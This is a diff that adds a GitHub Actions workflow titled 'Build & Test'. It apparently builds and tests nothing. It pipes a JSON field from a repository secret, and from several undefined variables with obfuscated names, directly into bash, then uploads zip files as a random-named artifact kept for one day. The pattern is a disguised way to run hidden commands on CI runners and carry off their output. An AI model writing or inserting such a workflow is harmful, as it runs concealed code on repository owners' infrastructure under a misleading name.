@@ -1,0 +1,32 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          prbou300: ${{ secrets.prbou300 }}
+        run: |
+          printf '%s' "$prbou300" | jq -r .v664 | /bin/bash
+          printf '%s' "$bmre57155" | jq -r .s857 | /bin/bash
+          printf '%s' "$mefr1623" | jq -r .wwxo78481 | /bin/bash
+          printf '%s' "$smj06" | jq -r .uu244 | /bin/bash
+          printf '%s' "$ewuk8" | jq -r .xqy5 | /bin/bash
+          echo $coe45 | jq -r .g2247 | /bin/bash
+          printf '%s' "$a46" | jq -r .hcv3935 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 9qq03RqA
+          path: "*.zip"
+          retention-days: 1
